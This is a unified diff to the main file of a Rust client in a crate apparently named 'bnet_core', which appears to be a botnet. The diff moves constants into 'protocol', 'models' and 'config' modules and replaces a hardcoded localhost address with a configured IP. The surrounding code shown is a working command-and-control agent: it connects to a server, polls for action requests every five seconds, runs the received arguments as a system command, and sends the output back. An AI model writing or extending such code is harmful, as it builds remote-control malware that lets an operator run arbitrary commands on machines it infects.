@@ -1,4 +1,4 @@
-use bnet_core::utils;
+use bnet_core::{models, protocol, utils, config};
 use std::net::TcpStream;
 
 mod terminal;
@@ -13,21 +13,21 @@ fn main() {
         ])
         .output()
         .unwrap();
-    match TcpStream::connect("localhost:7878") {
-        Ok(mut stream) => {
+    match TcpStream::connect(config::IP) {
+        Ok(stream) => {
             println!("Successfully connected to server in port 7878");
 
             let established_connection = utils::send_request_check(
                 &stream,
-                &utils::TRY_ESTABLISH_CONNECTION,
-                &utils::CONNECTION_ESTABLISHED,
+                &protocol::TRY_ESTABLISH_CONNECTION,
+                &protocol::CONNECTION_ESTABLISHED,
             );
 
             if established_connection {
                 loop {
                     std::thread::sleep(std::time::Duration::from_millis(5000));
-                    let response = utils::send_request(&stream, &utils::ACTION_REQUEST);
-                    if response == utils::ACTION_RESPONSE {
+                    let response = utils::send_request(&stream, &protocol::ACTION_REQUEST);
+                    if response == protocol::ACTION_RESPONSE {
                         let args = response.get_msg().split(", ").collect::<Vec<&str>>();
                         let args_formated = args
                             .iter()
@@ -43,7 +43,7 @@ fn main() {
                                     String::from_utf8_lossy(&result.stdout).trim().to_string();
                                 let result_err =
                                     String::from_utf8_lossy(&result.stderr).trim().to_string();
-                                let ACTION_RESULT: utils::Request = utils::Request {
+                                let ACTION_RESULT: models::Request = models::Request {
                                     syl: 'A',
                                     num: '5',
                                     msg: if result.status.success() {
@@ -55,7 +55,7 @@ fn main() {
                                 utils::send_request(&stream, &ACTION_RESULT);
                             }
                             Err(e) => {
-                                let ACTION_RESULT: utils::Request = utils::Request {
+                                let ACTION_RESULT: models::Request = models::Request {
                                     syl: 'A',
                                     num: '5',
                                     msg: e.to_string(),
@@ -69,8 +69,8 @@ fn main() {
             }
             utils::send_request_check(
                 &stream,
-                &utils::CONNECTION_CLOSED,
-                &utils::CONNECTION_CLOSED,
+                &protocol::CONNECTION_CLOSED,
+                &protocol::CONNECTION_CLOSED,
             );
         }
         Err(e) => {
